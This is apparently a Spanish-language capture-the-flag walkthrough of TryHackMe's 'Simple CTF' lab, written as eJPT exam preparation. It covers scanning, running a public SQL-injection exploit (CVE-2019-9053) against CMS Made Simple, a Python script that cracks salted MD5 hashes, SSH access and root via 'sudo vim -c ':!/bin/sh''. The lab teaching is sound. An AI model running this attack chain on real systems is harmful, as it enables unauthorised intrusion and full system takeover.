---
title: "Simple CTF"
date: 2025-10-13
draft: false
description: "Walkthrough de Simple CTF de TryHackMe. FTP anónimo, SQLi CVE-2019-9053 en CMS Made Simple, crackeo de hash salado y escalada via sudo vim — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "sqli",
    "ftp",
    "cms",
    "vim",
    "sudo",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 4
---

## Resumen

**Simple CTF** es la cuarta máquina de la serie _Road to eJPTv2_ y la más interesante hasta ahora en términos de variedad técnica. Introduce tres vectores nuevos: **acceso FTP anónimo**, **explotación de SQLi con un CVE real** (CVE-2019-9053) contra CMS Made Simple, y **escalada de privilegios via sudo vim**. Además, el hash obtenido está salado, lo que requiere un script de crackeo personalizado — una habilidad diferenciadora.

| Atributo       | Valor                                                      |
| -------------- | ---------------------------------------------------------- |
| **Plataforma** | TryHackMe                                                  |
| **Dificultad** | Fácil                                                      |
| **OS**         | Linux                                                      |
| **Sala**       | [Simple CTF](https://tryhackme.com/room/easyctf)           |
| **Skills**     | FTP Enum, Web Enum, SQLi, Hash Cracking, SSH, Sudo Privesc |

### 🎥 Versión en video

{{< youtube fC-5pqH2h54 >}}

> Si prefieres seguir el walkthrough paso a paso, continúa leyendo. El video cubre el mismo proceso en formato visual.

### Herramientas usadas

- `nmap` — enumeración de puertos y servicios
- `ftp` — acceso anónimo al servidor FTP
- `gobuster` — fuzzing de directorios web
- `searchsploit` — búsqueda de exploits conocidos
- Script Python3 personalizado — explotación de CVE-2019-9053
- Script Python3 personalizado — crackeo de hash MD5 salado
- `ssh` — acceso con credenciales obtenidas

### Resumen de la solución

1. Nmap revela tres servicios: FTP (21), HTTP (80) y SSH en puerto no estándar (2222)
2. FTP permite login anónimo pero el modo pasivo da timeout
3. Gobuster descubre `/simple/` — CMS Made Simple versión 2.2.8
4. Searchsploit identifica CVE-2019-9053 — SQLi basada en tiempo
5. Script Python3 extrae: salt, usuario `mitch`, email y hash MD5
6. Script de crackeo personalizado obtiene la contraseña: `secret`
7. Acceso SSH como `mitch` en puerto 2222 → flag de usuario
8. `sudo -l` revela que `mitch` puede ejecutar vim como root
9. Abuso de vim con `sudo vim -c ':!/bin/sh'` → root

---

## Reconocimiento

### Verificación de conectividad

```bash
ping -c 1 10.201.40.102
64 bytes from 10.201.40.102: icmp_seq=1 ttl=60 time=140 ms
```

> **TTL=60** → la máquina objetivo es **Linux**.

### Escaneo de puertos con Nmap

Primer barrido a todos los puertos TCP:

```bash
nmap 10.201.40.102 -n -Pn -sS -p- --min-rate 5000 -oG allTCPports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Tres puertos abiertos — más superficie de ataque que en las máquinas anteriores. Destaca el **puerto 2222**: Nmap lo identifica como EtherNetIP-1, pero el escaneo de versiones revelará su verdadera naturaleza.

Escaneo dirigido con versiones y scripts:

```bash
nmap 10.201.40.102 -n -Pn -sS -sVC -p21,80,2222 --min-rate 5000 -oN simplescan.txt
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

> **Hallazgos clave:**
>
> - **Puerto 21:** vsftpd 3.0.3 con **login anónimo habilitado** — primer vector a explorar
> - **Puerto 80:** Apache con `robots.txt` que menciona `/openemr-5_0_1_3` — posible CMS
> - **Puerto 2222:** SSH corriendo en puerto no estándar — administradores a veces mueven SSH para evitar bots, pero no es una medida de seguridad real

### Enumeración FTP anónimo

El login anónimo en FTP significa que podemos conectarnos sin credenciales:

```bash
ftp 10.201.40.102 21
Name: anonymous
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode (|||43213|)
```

> **Problema de modo pasivo:** el servidor FTP entra en modo pasivo extendido pero da timeout al listar directorios. Esto es común cuando hay restricciones de red entre el cliente y el servidor. El FTP anónimo no nos da información útil directa en este caso, pero confirma que hay una configuración laxa de seguridad en el servidor.

### Enumeración web

#### robots.txt

Ya lo detectó Nmap — lo revisamos manualmente:

```
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
```

> **Posible usuario:** el comentario del archivo menciona `mike` como autor original. Anotamos para posible bruteforce posterior.

#### Fuzzing con Gobuster

```bash
gobuster dir -u http://10.201.40.102 \
  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 -x php,txt,xml,html,bak
    /index.html     (Status: 200)
    /robots.txt     (Status: 200)
    /simple         (Status: 301)
    /server-status  (Status: 403)
```

> **Hallazgo clave:** directorio `/simple/` — navegando a `http://10.201.40.102/simple/` encontramos **CMS Made Simple**. Revisando el código fuente de la página identificamos la versión: **2.2.8**.

### Búsqueda de exploits con Searchsploit

Con la versión del CMS identificada, buscamos exploits conocidos:

```bash
searchsploit simple CMS 2.2.8
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

> **CVE-2019-9053** — SQLi no autenticada basada en tiempo en CMS Made Simple versiones anteriores a 2.2.10. No necesitamos credenciales para explotarla, lo que la hace especialmente peligrosa.

---

## Explotación

### CVE-2019-9053: SQL Injection basada en tiempo

El exploit original de Searchsploit está escrito en Python 2. Como usamos Python 3, necesitamos una versión adaptada. El exploit usa **time-based blind SQLi** para extraer información carácter por carácter midiendo los tiempos de respuesta del servidor.

Instalamos dependencias:

```bash
pip install requests termcolor
```

Ejecutamos el exploit apuntando al directorio del CMS:

```bash
python3 exploit.py -u http://10.201.40.102/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

> **¿Cómo funciona la SQLi basada en tiempo?** El exploit inyecta consultas SQL que incluyen `SLEEP()` — si la condición es verdadera, el servidor tarda más en responder. Midiendo estos tiempos, el script extrae la información bit a bit. Es más lento que una SQLi directa pero igual de efectivo.

### Crackeo del hash MD5 salado

El hash obtenido no es un MD5 simple — está **salado** con `1dac0d92e9fa6bb2`. Esto significa que el hash es `MD5(salt + password)`, no simplemente `MD5(password)`. Las herramientas estándar como `john` o `hashcat` requieren configuración especial para hashes salados, así que usamos un script Python3 personalizado:

```python
#!/usr/bin/env python3
import hashlib, sys

def try_crack(salt, target_hash, wordlist_path):
    target_hash = target_hash.strip().lower()
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            candidate = line.rstrip('\n')
            h = hashlib.md5((salt + candidate).encode('utf-8')).hexdigest()
            if h == target_hash:
                print("[+] Contraseña encontrada:", candidate)
                return candidate
    print("[-] No encontrada en el wordlist")

salt = sys.argv[1]
target_hash = sys.argv[2]
wordlist = sys.argv[3]
try_crack(salt, target_hash, wordlist)
```

```bash
python3 crack.py 1dac0d92e9fa6bb2 0c01f4468bd75d7a84c7eb73846e8d96 /usr/share/wordlists/rockyou.txt
[+] Found (full match): secret
```

> **Credenciales obtenidas:** `mitch:secret`

---

## Post-explotación

### Acceso SSH

Con las credenciales obtenidas, accedemos via SSH en el puerto no estándar:

```bash
ssh mitch@10.201.40.102 -p 2222
Welcome to Ubuntu 16.04.6 LTS
mitch@Machine:~$
```

Estabilizamos la shell:

```bash
export TERM=xterm
export SHELL=bash
```

### Identidad y contexto

```bash
id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

### Flag de usuario

```bash
cat ~/user.txt
```

> **Flag de usuario:** `G00d j0b, keep up!`

### Enumeración de usuarios del sistema

```bash
ls /home
mitch  sunbath
```

Hay otro usuario: `sunbath`. Lo anotamos para posible escalada lateral.

### Búsqueda de binarios SUID

```bash
find / -perm -4000 2>/dev/null
```

En esta máquina no hay binarios SUID explotables — todos los que aparecen son estándar del sistema. Descartamos este vector y pasamos al siguiente.

### Enumeración de sudo

```bash
sudo -l
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
```

> **Hallazgo crítico:** `mitch` puede ejecutar `vim` como root sin contraseña. Vim tiene capacidad de ejecutar comandos de shell internamente — esto es escalada directa.

---

## Escalada de privilegios

### Abuso de sudo vim

Vim permite ejecutar comandos del sistema operativo directamente desde su modo de comandos con `:!comando`. Si lo ejecutamos con sudo, esos comandos corren como root:

```bash
sudo vim -c ':!/bin/sh'
```

```bash
# whoami
root
```

> **¿Qué hace este comando?**
>
> - `sudo vim` abre vim con privilegios de root
> - `-c ':!/bin/sh'` ejecuta el comando `:!/bin/sh` automáticamente al abrirse
> - `:!` en vim ejecuta comandos del sistema
> - `/bin/sh` abre una shell — que hereda los privilegios de root de vim

### Flag de root

```bash
cd /root
cat root.txt
```

> **Flag de root:** `W3ll d0n3. You made it!`

---

## Lecciones aprendidas

- **FTP anónimo en producción es una mala práctica** — Aunque en este caso no dio acceso directo, confirma configuraciones laxas. En entornos reales, FTP anónimo puede exponer archivos sensibles.
- **Siempre busca la versión exacta del CMS o aplicación web** — La versión 2.2.8 de CMS Made Simple tenía una SQLi pública. Un atacante real consultaría CVE databases inmediatamente después de identificar el software y su versión. Esta información está en el código fuente de la página.
- **Los hashes salados requieren crackeo personalizado** — Un hash MD5 simple se crackea con `john` o `hashcat` directo. Un hash salado necesita que tu herramienta conozca el salt. Entender cómo funcionan los hashes salados (y escribir un script para crackearlos) es una habilidad que te diferencia.
- **SSH en puerto no estándar no es seguridad** — Mover SSH al puerto 2222 solo evita bots básicos. Nmap lo detecta en segundos con el escaneo de versiones. La seguridad real viene de claves SSH, 2FA y hardening del servicio.
- **`sudo -l` siempre, siempre, siempre** — En las tres máquinas anteriores y en esta, `sudo -l` fue el vector de privesc o confirmó la ausencia de él. Es el primer comando que debes ejecutar después de obtener shell.
- **GTFOBins para sudo** — Vim, less, more, nano, python, perl... docenas de herramientas comunes pueden usarse para escalar privilegios si se ejecutan via sudo. GTFOBins es la referencia definitiva.

### Para la eJPT

Esta máquina ejercita habilidades directamente evaluadas en la eJPT:

- Enumeración de múltiples servicios (FTP, HTTP, SSH)
- Identificación de versiones de aplicaciones web
- Uso de exploits públicos (Searchsploit + CVE)
- Comprensión básica de SQLi
- Crackeo de hashes (con y sin salt)
- Acceso SSH con credenciales obtenidas
- Escalada de privilegios via sudo misconfigurations

**Tiempo aproximado de resolución:** 40-60 minutos — la SQLi basada en tiempo es lenta por naturaleza.

---

## Referencias

- [Simple CTF — TryHackMe](https://tryhackme.com/room/easyctf)
- [CVE-2019-9053 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [CMS Made Simple — Wikipedia](https://en.wikipedia.org/wiki/CMS_Made_Simple)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
